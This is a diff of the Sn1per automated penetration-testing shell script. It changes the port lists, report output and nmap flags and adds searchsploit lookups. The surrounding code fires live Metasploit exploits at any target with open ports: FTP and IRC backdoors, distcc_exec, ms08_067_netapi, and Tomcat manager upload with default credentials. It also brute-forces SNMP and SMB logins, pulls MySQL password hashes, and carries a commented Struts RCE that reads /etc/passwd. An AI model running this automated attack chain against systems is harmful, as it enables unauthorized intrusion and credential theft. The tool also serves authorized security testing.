@@ -98,6 +98,8 @@ PASS_FILE="/usr/share/brutex/wordlists/password.lst"
 DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
 SUPER_MICRO_SCAN="/usr/share/sniper/plugins/SuperMicro-Password-Scanner/supermicro_scan.sh"
 DEFAULT_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049"
+DEFAULT_TCP_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152"
+DEFAULT_UDP_PORTS="53,67,68,88,161,162,137,138,139,389,520,2049"
 THREADS="30"
 OKBLUE='\033[94m'
 OKRED='\033[91m'
@@ -150,8 +152,13 @@ function loot {
 	echo -e "$OKORANGE + -- --=[Generating reports...$RESET"
 	for a in `ls sniper-*.txt 2>/dev/null`; 
 	do 
-		echo "$a" > $LOOT_DIR/reports/$a
-		sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a >> $LOOT_DIR/reports/$a
+		# HTML OUTPUT
+		echo "$a" | aha --black > $LOOT_DIR/reports/$a.html
+		cat "$a" | aha --black >> $LOOT_DIR/reports/$a.html
+		# TEXT OUTPUT DISABLED
+		#echo "$a" | aha --black > $LOOT_DIR/reports/$a
+		#sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a >> $LOOT_DIR/reports/$a
+		# CONSOLE OUTPUT
 		mv $a $LOOT_DIR/output/
 	done
 	echo -e "$OKORANGE + -- --=[Removing blank web screenshots...$RESET"
@@ -280,24 +287,29 @@ if [ "$MODE" = "discover" ]; then
 	echo -e "$OKRED                                                                   \/$RESET"
 	echo ""
 	echo -e "$OKGREEN + -- ----------------------------=[Running Ping Discovery Scan]=------------- -- +$RESET"
-	nmap -sP $TARGET | grep ' for ' | awk '{print $5}' | tee $LOOT_DIR/domains/sniper-ips.txt
+	nmap -sP $TARGET | grep ' for ' | awk '{print $5}' | tee $LOOT_DIR/domains/sniper-ping-ips.txt
 	echo -e "$OKGREEN + -- ----------------------------=[Checking ARP Cache]=---------------------- -- +$RESET"
-	arp -a -n
-	echo -e "$OKGREEN + -- ----------------------------=[Running Port Discovery Scan]=------------- -- +$RESET"
-	unicornscan -p $DEFAULT_PORTS $TARGET 2>/dev/null | awk '{print $6}' | sort -u >> $LOOT_DIR/domains/sniper-ips.txt
-	sort -u $LOOT_DIR/domains/sniper-ips.txt > $LOOT_DIR/domains/sniper-ips.txt
+	arp -a -n | tee $LOOT_DIR/domains/sniper-arp-ips.txt
+	echo -e "$OKGREEN + -- ----------------------------=[Running TCP Port Discovery Scan]=--------- -- +$RESET"
+	unicornscan -p $DEFAULT_TCP_PORTS $TARGET 2>/dev/null | tee $LOOT_DIR/domains/sniper-tcp-ports.txt
+	cat $LOOT_DIR/domains/sniper-tcp-ports.txt | awk '{print $6}' | sort -u | tee $LOOT_DIR/domains/sniper-tcp-ips.txt
+	echo -e "$OKGREEN + -- ----------------------------=[Running UDP Port Discovery Scan]=--------- -- +$RESET"
+	unicornscan -m U -p $DEFAULT_UDP_PORTS $TARGET 2>/dev/null | tee $LOOT_DIR/domains/sniper-udp-ports.txt
+	cat $LOOT_DIR/domains/sniper-udp-ports.txt | awk '{print $6}' | sort -u > $LOOT_DIR/domains/sniper-udp-ips.txt
 	echo -e "$OKGREEN + -- ----------------------------=[Current Targets]=------------------------- -- +$RESET"
+	cat $LOOT_DIR/domains/sniper-ping-ips.txt $LOOT_DIR/domains/sniper-tcp-ips.txt $LOOT_DIR/domains/sniper-udp-ips.txt > $LOOT_DIR/domains/sniper-ips-unsorted.txt
+	sort -u $LOOT_DIR/domains/sniper-ips-unsorted.txt > $LOOT_DIR/domains/sniper-ips.txt 
 	cat $LOOT_DIR/domains/sniper-ips.txt
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Sn1per Scans]=------------------ -- +$RESET"
 	echo ""
 	if [ "$OPT1" = "report" ]; then
 		for a in `cat $LOOT_DIR/domains/sniper-ips.txt` 
-			do sniper $a stealth report
+			do sniper $a report
 		done
 		exit
 	fi	
 	for a in `cat $LOOT_DIR/domains/sniper-ips.txt` 
-		do sniper $a stealth 
+		do sniper $a 
 	done
 	exit
 fi
@@ -391,7 +403,7 @@ if [ "$MODE" = "stealth" ]; then
 	fi
 	echo ""
 	echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
-	nmap -sS -T5 --open -P0 -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+	nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 	
 	port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 	port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -536,7 +548,7 @@ if [ "$MODE" = "airstrike" ]; then
 		fi
 		echo ""
 		echo -e "$OKGREEN + -- ----------------------------=[Running port scan]=------------------- -- +$RESET"
-		nmap -sS -T5 --open -P0 -p $DEFAULT_PORTS $a -oX $LOOT_DIR/nmap/nmap-$a.xml
+		nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $a -oX $LOOT_DIR/nmap/nmap-$a.xml
 		
 		port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
 		port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
@@ -604,9 +616,13 @@ if [ "$MODE" = "fullportonly" ]; then
 	echo -e "$RESET"
 	echo -e "$OKGREEN + -- ----------------------------=[Performing Port Scan]=------------------- -- +$RESET"
 	if [ -z "$OPT1" ]; then
-		nmap -T4 -sV -O -v -p 1-65355 --script=* -P0 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+		nmap -T4 -sV -O -v -p 1-65355 --script=* -Pn $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+		echo -e "$OKGREEN + -- ----------------------------=[Enumerating Exploits]=------------------- -- +$RESET"
+		searchsploit --nmap $LOOT_DIR/nmap/nmap-$TARGET.xml
 	else 
-		nmap -T4 -sV -O -v -p $OPT1 --script=* -P0 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+		nmap -T4 -sV -O -v -p $OPT1 --script=* -Pn $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+		echo -e "$OKGREEN + -- ----------------------------=[Enumerating Exploits]=------------------- -- +$RESET"
+		searchsploit --nmap $LOOT_DIR/nmap/nmap-$TARGET.xml
 	fi
 	echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
 	exit
@@ -712,13 +728,13 @@ ping -c 1 $TARGET
 echo ""
 echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
 if [ -z "$OPT1" ]; then
-	nmap -sS -T5 --open -P0 -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+	nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 elif [ "$OPT1" == "web" ]; then
-	nmap -sV -T5 -P0 -p 80,443  --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+	nmap -sV -T5 -Pn -p 80,443  --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 else
-	nmap -sS -T5 -P0 -p $OPT1 --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+	nmap -sS -T5 -Pn -p $OPT1 --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 	echo -e "$OKGREEN + -- ----------------------------=[Running UDP port scan]=------------------- -- +$RESET"
-	nmap -sU -T5 -P0 -p U:$OPT1 --open $TARGET
+	nmap -sU -T5 -Pn -p U:$OPT1 --open $TARGET
 fi
 
 if [ -z $DISABLE_POSTGRESQL ]; then service postgresql start; fi
@@ -781,7 +797,7 @@ then
 	echo -e "$OKRED + -- --=[Port 21 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 21 opened... running tests...$RESET"	
-	nmap -A -sV -P0 -sC -T5 -p 21 --script=ftp-* $TARGET
+	nmap -A -sV -Pn -sC -T5 -p 21 --script=ftp-* $TARGET
 	msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
 fi
 
@@ -793,7 +809,7 @@ else
 	cd $PLUGINS_DIR/ssh-audit
 	python ssh-audit.py $TARGET:22
 	cd $INSTALL_DIR
-	nmap -A -sV -P0 -sC -T5 -p 22 --script=ssh-* $TARGET
+	nmap -A -sV -Pn -sC -T5 -p 22 --script=ssh-* $TARGET
 	msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
 fi
 
@@ -804,7 +820,7 @@ else
 	echo -e "$OKORANGE + -- --=[Port 23 opened... running tests...$RESET"
 	echo ""
 	cisco-torch -A $TARGET
-	nmap -A -sV -P0 -T5 --script=telnet* -p 23 $TARGET
+	nmap -A -sV -Pn -T5 --script=telnet* -p 23 $TARGET
 	msfconsole -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"
 fi
 
@@ -813,7 +829,7 @@ then
 	echo -e "$OKRED + -- --=[Port 25 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 25 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=smtp* -p 25 $TARGET
+	nmap -A -sV -Pn -T5 --script=smtp* -p 25 $TARGET
 	smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
 	msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" 
 fi
@@ -823,7 +839,7 @@ then
 	echo -e "$OKRED + -- --=[Port 53 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 53 opened... running tests...$RESET"
-	nmap -A -sU -sV -P0 -T5 --script=dns* -p U:53,T:53 $TARGET	
+	nmap -A -sU -sV -Pn -T5 --script=dns* -p U:53,T:53 $TARGET	
 fi
 
 if [ -z "$port_79" ];
@@ -831,7 +847,7 @@ then
 	echo -e "$OKRED + -- --=[Port 79 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 79 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=finger* -p 79 $TARGET
+	nmap -A -sV -Pn -T5 --script=finger* -p 79 $TARGET
 	bin/fingertool.sh $TARGET $USER_FILE
 fi
 
@@ -908,7 +924,7 @@ else
 	then
 		echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
 		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
-		nmap -A -P0 -T5 -p 80 -sV --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
+		nmap -A -Pn -T5 -p 80 -sV --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
 		dirb http://$TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
@@ -1009,7 +1025,7 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 162 opened... running tests...$RESET"
 	for a in `cat /usr/share/brutex/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
-	nmap -A -p 162 -P0 --script=snmp* $TARGET
+	nmap -A -p 162 -Pn --script=snmp* $TARGET
 fi
 
 if [ -z "$port_389" ];
@@ -1017,7 +1033,7 @@ then
 	echo -e "$OKRED + -- --=[Port 389 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 389 opened... running tests...$RESET"
-	nmap -A -p 389 -P0 -T5 --script=ldap* $TARGET
+	nmap -A -p 389 -Pn -T5 --script=ldap* $TARGET
 fi
 
 if [ -z "$port_443" ];
@@ -1099,7 +1115,7 @@ else
 	if [ "$MODE" = "web" ];
 	then
 		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
-		nmap -A -sV -T5 -P0 -p 443 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
+		nmap -A -sV -T5 -Pn -p 443 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
 		dirb https://$TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
@@ -1161,7 +1177,7 @@ else
 	enum4linux $TARGET
 	python $SAMRDUMP $TARGET
 	nbtscan $TARGET
-	nmap -A -sV -P0 -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
+	nmap -A -sV -Pn -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
 	msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"
 fi
 
@@ -1170,7 +1186,7 @@ then
 	echo -e "$OKRED + -- --=[Port 512 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 512 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 -p 512 --script=rexec* $TARGET
+	nmap -A -sV -Pn -T5 -p 512 --script=rexec* $TARGET
 fi
 
 if [ -z "$port_513" ]
@@ -1178,7 +1194,7 @@ then
 	echo -e "$OKRED + -- --=[Port 513 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 513 opened... running tests...$RESET"
-	nmap -A -sV -T5 -P0 -p 513 --script=rlogin* $TARGET
+	nmap -A -sV -T5 -Pn -p 513 --script=rlogin* $TARGET
 fi
 
 if [ -z "$port_514" ];
@@ -1195,7 +1211,7 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 623 opened... running tests...$RESET"
 	amap $TARGET 623 -A
-	nmap -A -sV -P0 -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET
+	nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET
 fi
 
 if [ -z "$port_624" ];
@@ -1204,7 +1220,7 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 624 opened... running tests...$RESET"
 	amap $TARGET 624 -A
-	nmap -A -sV -P0 -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET
+	nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET
 fi
 
 if [ -z "$port_1099" ];
@@ -1213,7 +1229,7 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 1099 opened... running tests...$RESET"
 	amap $TARGET 1099 -A
-	nmap -A -sV -P0 -T5 -p 1099 --script=rmi-* $TARGET
+	nmap -A -sV -Pn -T5 -p 1099 --script=rmi-* $TARGET
 	msfconsole -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run;"
 	msfconsole -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run;"
 fi
@@ -1223,7 +1239,7 @@ then
 	echo -e "$OKRED + -- --=[Port 1433 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 1433 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=ms-sql* -p 1433 $TARGET
+	nmap -A -sV -Pn -T5 --script=ms-sql* -p 1433 $TARGET
 fi
 
 if [ -z "$port_2049" ];
@@ -1231,7 +1247,7 @@ then
 	echo -e "$OKRED + -- --=[Port 2049 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 2049 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=nfs* -p 2049 $TARGET
+	nmap -A -sV -Pn -T5 --script=nfs* -p 2049 $TARGET
 	rpcinfo -p $TARGET
 	showmount -e $TARGET
 	smbclient -L $TARGET -U " "%" "
@@ -1242,7 +1258,7 @@ then
 	echo -e "$OKRED + -- --=[Port 2121 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 2121 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=ftp* -p 2121 $TARGET
+	nmap -A -sV -Pn -T5 --script=ftp* -p 2121 $TARGET
 	msfconsole -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
 fi
 
@@ -1251,7 +1267,7 @@ then
 	echo -e "$OKRED + -- --=[Port 3306 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 3306 opened... running tests...$RESET"
-	nmap -A -sV -P0 --script=mysql* -p 3306 $TARGET
+	nmap -A -sV -Pn --script=mysql* -p 3306 $TARGET
 	mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'
 fi
 
@@ -1260,7 +1276,7 @@ then
 	echo -e "$OKRED + -- --=[Port 3310 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 3310 opened... running tests...$RESET"
-	nmap -A -p 3310 -P0 -T5 -sV  --script clamav-exec $TARGET
+	nmap -A -p 3310 -Pn -T5 -sV  --script clamav-exec $TARGET
 fi
 
 if [ -z "$port_3128" ];
@@ -1268,7 +1284,7 @@ then
 	echo -e "$OKRED + -- --=[Port 3128 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 3128 opened... running tests...$RESET"
-	nmap -A -p 3128 -P0 -T5 -sV  --script=*proxy* $TARGET
+	nmap -A -p 3128 -Pn -T5 -sV  --script=*proxy* $TARGET
 fi
 
 if [ -z "$port_3389" ];
@@ -1276,7 +1292,7 @@ then
 	echo -e "$OKRED + -- --=[Port 3389 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 3389 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=rdp-* -p 3389 $TARGET
+	nmap -A -sV -Pn -T5 --script=rdp-* -p 3389 $TARGET
 	rdesktop $TARGET &
 fi
 
@@ -1285,7 +1301,7 @@ then
 	echo -e "$OKRED + -- --=[Port 3632 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 3632 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=distcc-* -p 3632 $TARGET
+	nmap -A -sV -Pn -T5 --script=distcc-* -p 3632 $TARGET
 	msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"
 fi
 
@@ -1306,7 +1322,7 @@ else
 	cd $INSTALL_DIR
 	nikto -h https://$TARGET:4443 
 	cutycapt --url=https://$TARGET:4443 --out=$LOOT_DIR/screenshots/$TARGET-port4443.jpg
-	nmap -sV -P0 -A -p 4443 -T5 --script=*proxy* $TARGET
+	nmap -sV -Pn -A -p 4443 -T5 --script=*proxy* $TARGET
 fi
 
 if [ -z "$port_5432" ];
@@ -1314,7 +1330,7 @@ then
 	echo -e "$OKRED + -- --=[Port 5432 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 5432 opened... running tests...$RESET"
-	nmap -A -sV -P0 --script=pgsql-brute -p 5432 $TARGET
+	nmap -A -sV -Pn --script=pgsql-brute -p 5432 $TARGET
 fi
 
 if [ -z "$port_5800" ];
@@ -1322,7 +1338,7 @@ then
 	echo -e "$OKRED + -- --=[Port 5800 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 5800 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=vnc* -p 5800 $TARGET
+	nmap -A -sV -Pn -T5 --script=vnc* -p 5800 $TARGET
 fi
 
 if [ -z "$port_5900" ];
@@ -1338,7 +1354,7 @@ then
 	echo -e "$OKRED + -- --=[Port 5984 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 5984 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=couchdb* -p 5984 $TARGET
+	nmap -A -sV -Pn -T5 --script=couchdb* -p 5984 $TARGET
 	msfconsole -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"
 fi
 
@@ -1347,7 +1363,7 @@ then
 	echo -e "$OKRED + -- --=[Port 6000 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 6000 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=x11* -p 6000 $TARGET
+	nmap -A -sV -Pn -T5 --script=x11* -p 6000 $TARGET
 	msfconsole -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;"
 fi
 
@@ -1356,7 +1372,7 @@ then
 	echo -e "$OKRED + -- --=[Port 6667 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 6667 opened... running tests...$RESET"
-	nmap -A -sV -P0 -T5 --script=irc* -p 6667 $TARGET
+	nmap -A -sV -Pn -T5 --script=irc* -p 6667 $TARGET
 	msfconsole -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
 fi
 
@@ -1373,7 +1389,7 @@ else
 	cd ..
 	nikto -h http://$TARGET:8000 
 	cutycapt --url=http://$TARGET:8000 --out=$LOOT_DIR/screenshots/$TARGET-port8000.jpg
-	nmap -sV -P0 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000 -T5 $TARGET
+	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000 -T5 $TARGET
 fi
 
 if [ -z "$port_8100" ];
@@ -1392,7 +1408,7 @@ else
 	cd $INSTALL_DIR
 	nikto -h http://$TARGET:8100 
 	cutycapt --url=http://$TARGET:8100 --out=$LOOT_DIR/screenshots/$TARGET-port8100.jpg
-	nmap -sV -P0 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 -T5 $TARGET
+	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 -T5 $TARGET
 fi
 
 if [ -z "$port_8080" ];
@@ -1411,7 +1427,7 @@ else
 	cd $INSTALL_DIR
 	nikto -h http://$TARGET:8080 
 	cutycapt --url=http://$TARGET:8080 --out=$LOOT_DIR/screenshots/$TARGET-port8080.jpg
-	nmap -sV -P0 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080 -T5 --script=*proxy* $TARGET
+	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080 -T5 --script=*proxy* $TARGET
 	msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run; use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
 	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
@@ -1434,7 +1450,7 @@ else
 	cd $INSTALL_DIR
 	nikto -h http://$TARGET:8180 
 	cutycapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg
-	nmap -sV -P0 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
+	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
@@ -1457,7 +1473,7 @@ else
 	cd $INSTALL_DIR
 	nikto -h https://$TARGET:8443 
 	cutycapt --url=https://$TARGET:8443 --out=$LOOT_DIR/screenshots/$TARGET-port8443.jpg
-	nmap -sV -P0 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443 -T5 --script=*proxy* $TARGET
+	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443 -T5 --script=*proxy* $TARGET
 fi
 
 if [ -z "$port_8888" ];
@@ -1472,7 +1488,7 @@ else
 	xsstracer $TARGET 8888
 	nikto -h http://$TARGET:8888 
 	cutycapt --url=https://$TARGET:8888 --out=$LOOT_DIR/screenshots/$TARGET-port8888.jpg
-	nmap -sV -P0 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse  -A -p 8888 -T5 $TARGET
+	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse  -A -p 8888 -T5 $TARGET
 fi
 
 if [ -z "$port_10000" ];
@@ -1491,7 +1507,7 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 16992 opened... running tests...$RESET"
 	amap $TARGET 16992 -A
-	nmap -A -sV -P0 -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET
+	nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET
 fi
 
 if [ -z "$port_27017" ];
@@ -1499,7 +1515,7 @@ then
 	echo -e "$OKRED + -- --=[Port 27017 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 27017 opened... running tests...$RESET"
-	nmap -sV -p 27017 -P0 -T5 --script=mongodb* $TARGET
+	nmap -sV -p 27017 -Pn -T5 --script=mongodb* $TARGET
 fi
 
 if [ -z "$port_27018" ];
@@ -1507,7 +1523,7 @@ then
 	echo -e "$OKRED + -- --=[Port 27018 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 27018 opened... running tests...$RESET"
